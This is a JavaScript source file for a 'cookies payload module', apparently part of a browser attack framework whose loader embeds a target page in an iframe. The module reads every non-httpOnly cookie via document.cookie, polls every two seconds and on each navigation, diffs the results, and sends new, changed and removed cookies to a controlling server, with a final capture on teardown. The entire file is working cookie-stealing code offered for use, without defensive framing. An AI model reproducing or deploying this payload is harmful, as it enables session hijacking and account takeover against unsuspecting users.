/**
 * Cookies payload module.
 * Captures non-httpOnly cookies from the target page via document.cookie.
 * Polls every 2 seconds and re-polls on each iframe navigation.
 *
 * Only cookies accessible via JavaScript are captured — httpOnly cookies are
 * intentionally excluded by the browser's security model.
 */

let _send = null;
let _log = null;
let _iframe = null;
let _pollTimer = null;
let _lastCookieMap = new Map();

const POLL_INTERVAL = 2000;

/**
 * Parse a document.cookie string into a Map<name, value>.
 * Each name=value pair is separated by "; ".
 * @param {string} str
 * @returns {Map<string, string>}
 */
function parseCookies(str) {
  const map = new Map();
  if (!str) return map;
  for (const part of str.split(";")) {
    const eqIdx = part.indexOf("=");
    if (eqIdx === -1) {
      const name = part.trim();
      if (name) map.set(name, "");
    } else {
      const name = part.slice(0, eqIdx).trim();
      const value = part.slice(eqIdx + 1).trim();
      if (name) map.set(name, value);
    }
  }
  return map;
}

/**
 * Diff the current cookie state against the last known state.
 * Sends only changed (new/updated) and removed cookies.
 */
function pollCookies() {
  if (!_send || !_iframe) return;

  let cookieStr;
  try {
    cookieStr = _iframe.contentDocument?.cookie ?? "";
  } catch (_) {
    // Cross-origin iframe — cannot read cookies via JavaScript
    return;
  }

  const current = parseCookies(cookieStr);
  const changed = [];
  const timestamp = Date.now();

  // Detect new or changed cookies
  for (const [name, value] of current) {
    if (!_lastCookieMap.has(name) || _lastCookieMap.get(name) !== value) {
      changed.push({ name, value, timestamp });
    }
  }

  // Detect removed cookies
  for (const name of _lastCookieMap.keys()) {
    if (!current.has(name)) {
      changed.push({ name, value: null, removed: true, timestamp });
    }
  }

  _lastCookieMap = current;

  if (changed.length > 0) {
    _send("cookies", { cookies: changed });
  }
}

/**
 * Called on each iframe load — reset the last cookie map and re-poll.
 * This ensures cookies from the newly loaded page are captured.
 */
function onIframeLoad() {
  _lastCookieMap = new Map();
  pollCookies();
}

/**
 * Payload entry point. Called by the loader with the API context.
 * @param {object} params
 * @param {HTMLIFrameElement} params.iframe - The loader's iframe element
 * @param {Function} params.send - Send a text payload message to the server
 * @param {Function} params.log - Send a diagnostic log message to the server
 */
export function init({ iframe, send, log }) {
  _send = send;
  _log = log;
  _iframe = iframe;

  if (_log) _log("info", "Cookies payload initialized");

  // Re-poll on each iframe navigation
  _iframe.addEventListener("load", onIframeLoad);

  // Immediate poll on init
  pollCookies();

  // Periodic poll
  _pollTimer = setInterval(pollCookies, POLL_INTERVAL);
}

/**
 * Clean up all state when the payload is unloaded.
 * Performs a final poll to capture any last-minute changes before teardown.
 */
export function destroy() {
  // Final poll before teardown
  pollCookies();

  if (_pollTimer) {
    clearInterval(_pollTimer);
    _pollTimer = null;
  }

  if (_iframe) {
    _iframe.removeEventListener("load", onIframeLoad);
  }

  _send = null;
  _log = null;
  _iframe = null;
  _lastCookieMap = new Map();
}
